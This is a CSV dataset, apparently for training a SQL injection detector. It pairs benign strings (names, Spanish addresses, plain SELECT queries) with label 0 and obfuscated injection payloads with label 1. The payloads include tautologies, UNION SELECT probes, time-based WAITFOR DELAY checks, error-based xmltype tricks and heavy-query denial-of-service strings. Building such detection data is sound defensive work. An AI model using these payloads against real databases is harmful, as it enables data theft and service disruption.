Query,Label
crabe,0
acr7m6nia,0
1'	) where2852= 2852,1
doralie,0
1'	)  ) 	 	and 6240	=		  (	 'qqpjq'||( select case6240when6240then1else 0 endfrom rdb$database	)||'qzvzq' )  and	 ( (  'rgyc'  = 'rgyc,1
"-9638  )) 		)	 orelt(	1032 =	1032,3623	)		and 	(		(	 ( 3679 	=	3679",1
foulk@eonon.com.es,0
"1""	)	where1699	=	1699 or	4915	=		(	 select count(* 	)fromdomain.domains as	t1,domain.columnsas t2,domain.tables	ast3 )	 --",1
darnall,0
"-8301')	 union allselect	1806,1806--",1
SELECT * FROM kids ORDER BY circle,0
rozaln del monte,0
SELECT * FROM steam WHERE using = 'fellow' LIMIT 3,0
dulcera,0
yunquera de henares,0
"-1763%"" or(	8459=	8459  )*4906and ""%""=	""",1
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,0
"1'  )or5286		=	 		( 	selectcount	( *)	from all_userst1,all_userst2,all_userst3,all_users t4,all_userst5 )",1
sedran,0
"c/ gallarza, 147",0
91394289v,0
1)  where3381	=		3381and	3754 = 	 	(	select	upper (xmltype	( chr	(	60 )  ||chr	(58	 )	||chr (	113) ||chr ( 113)	||chr( 112	 )	||chr		(106		)||chr	(	113 )|| (select	(casewhen (	3754=3754	)	 	then1 else 0 end	) 	 from	dual	 )	||chr( 113 )	||chr	( 122 ) ||chr ( 118	) 	||chr	(	122)	||chr	 (	113		)	 ||chr (  62	) )		 )			from dual)--,1
";	ifnot  ( 	substring 	(	 	( 	select@@version 	) ,25,1  )	<>0	 )  waitfordelay	'0:0:2'--",1
SELECT leaf ( s ) FROM medicine INNER JOIN,0
"1or8421	 =(	selectcount	( * )  fromgenerate_series		( 1,5000000			)	 	) -- xgyc",1
"select*	from users where id = 1unionselect11a,version ( 	)	--1",1
"1""	where	1719 = 	1719and 7533 	=7533--",1
SELECT earth ( s FROM national RIGHT JOIN,0
"1'	) asjuxt where5956 =5956and8148	= like	( 'abcdefg',upper( hex(	 randomblob(	 500000000/2	 	) ) ) )	 --",1
1 ) 		),1
eansor,0
d76en3r9n8z01,0
"carretera estacion, 144, 8-d",0
"iif( 9134	= 5736,1,1/0  )",1
"-2384'|| ( select'vhcp'fromdualwhere1266 	=1266 unionallselect1266,1266,1266,1266--",1
capella gorrn,0
castellanos de zapardiel,0
"1"") 	) 	 as	hacewhere	8785= 8785",1
"1 )  orchar (		119 	)||char (	100	)  ||char(	99 )	||char	(121) =regexp_substring	(repeat  (	right(	char  (	1441) ,0 	) ,5000000000) ,null) --",1
7stambrar,0
"1""or7552 =  ( selectcount(	 * ) 	fromrdb$fieldsast1,rdb$typesast2,rdb$collationsas	t3,rdb$functionsas t4		)	 and ""zcfa""  =""zcfa",1
1'||	( 	select'vvpn'from dualwhere	7011	=  7011and7756		= dbms_utility.sqlid_to_sqlhash( 	(	chr 	(	113)||chr  (	113 )		||chr	 (  112 )		||chr  ( 106	) ||chr (	113)	|| (  select	(case when  (	7756 	= 7756) then1	else0end ) 	fromdual )		||chr ( 113	)  ||chr		(		122 )		||chr ( 118 )	||chr	(	 122	)	||chr(		113  )		) 	  )   )  	||',1
ag-uzadura,0
1%')	and4595	=4595#,1
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0
